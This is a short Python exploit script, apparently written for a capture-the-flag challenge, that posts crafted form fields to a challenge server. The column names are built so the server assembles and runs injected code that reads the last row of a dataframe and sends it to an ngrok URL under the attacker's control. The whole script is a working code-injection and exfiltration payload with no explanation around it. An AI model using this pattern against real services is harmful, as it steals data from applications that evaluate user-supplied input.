import requests

data = {'numColumns': '5',
        'columnName0': 'test,',
        'columnName1': 'requests.get(',
        'columnName2': 'request.args.get(',
        'columnName3': 'delimiter_const)+',
        'columnName4': 'df.tail(1).to_string(header=False))#',
        'delimiter': '@'
        }


r = requests.post("https://tbtl-rnd-for-data-science.chals.io/generate?delimiter=https://e7f0-85-94-74-102.ngrok-free.app?param=", data=data)

print(r.text)
